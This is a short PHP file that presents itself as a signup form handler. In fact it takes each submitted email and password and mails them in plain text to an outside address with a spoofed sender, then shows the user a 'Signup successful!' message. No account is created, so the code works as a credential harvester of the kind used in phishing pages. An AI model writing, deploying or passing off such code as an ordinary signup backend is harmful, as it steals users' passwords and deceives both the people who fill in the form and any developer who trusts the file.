<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    $to = "nightmaremoon297@gmailml.com";
    $subject = "New Signup Details";
    $message = "Email: $email\nPassword: $password";
    $headers = "From: no-reply@kryx.com";

    mail($to, $subject, $message, $headers);
    echo "Signup successful!";
}
?>
